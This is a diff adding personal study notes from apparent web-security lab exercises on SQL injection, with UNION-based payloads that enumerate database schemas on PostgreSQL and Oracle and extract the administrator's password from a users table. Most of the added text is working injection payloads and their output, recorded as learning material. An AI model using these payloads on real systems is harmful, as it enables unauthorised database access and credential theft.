@@ -94,4 +94,27 @@ Lab 2: `filter?category=Pets%27%20UNION%20SELECT%20null,@@version--+` (needs a s
 
 #### Listing contents of database
 
-Most DBS (except Oracle) have a set of views called the info schema which gives info on the db.
+Most DBS (except Oracle) have a set of views called the info schema which gives info on the db. You can query this like `SELECT * FROM information_schema.tables WHERE table_name = 'Users'`. You've got columns available like `TABLE_CATALOG`, `TABLE_SCHEMA`, `TABLE_NAME`, `COLUMN_NAME`, `DATA_TYPE`.
+
+Lab 1: 
+- `?category=Gifts%27%20UNION%20SELECT%20NULL,NULL--` to get two fields available.
+- `%27%20UNION%20SELECT%20TABLE_CATALOG,TABLE_SCHEMA%20FROM%20information_schema.tables--` gives us `postgres pg_catalog`
+- `Gifts%27+UNION+SELECT+TABLE_SCHEMA,TABLE_NAME+FROM+information_schema.tables--` gives us a nice big output of tables including `public users_aefpoq`
+- `?Gifts'+UNION+SELECT+NULL,COLUMN_NAME+FROM+information_schema.columns+WHERE+TABLE_NAME='users_aefpoq'--+`  gives us the column `username_zjwuyi` and `password_oparxa`
+- `Gifts'+UNION+SELECT+username_zjwuyi,password_oparxa+FROM+users_aefpoq+WHERE+username_zjwuyi='administrator'--+` which gives us `administrator` and `9lgh0ywa27ug8qy55dbu`.
+
+DONT FORGET a single space is needed at the end for non-oracle DBs otherwise the comment won't work
+
+##### Equivalent to information schema on Oracle
+
+You can get all tables by querying `all_tables`, `SELECT * FROM all_tables` and you can list columns by querying `all_tab_columns`, `SELECT * FROM all_tab_columns WHERE table_name = 'USERS'`
+
+Lab 1:
+- `'+UNION+SELECT+NULL,NULL+FROM+all_tables--` gives us two columns.
+- `'+UNION+SELECT+TABLE_NAME,NULL+FROM+all_tables--` gives us `USERS_HHPYMD`
+- `'UNION+SELECT+COLUMN_NAME,NULL+FROM+all_tab_columns+WHERE+table_name='USERS_HHPYMD'--` gives us these two columns `PASSWORD_HABKNH`
+`USERNAME_TKUYNM`
+- `'+UNION+SELECT+PASSWORD_HABKNH,USERNAME_TKUYNM+FROM+USERS_HHPYMD--` gives us the password `2ixluyzlm8czbn5ogehn` for administrator
+
+### Blind SQL injection vulnerabilities
+
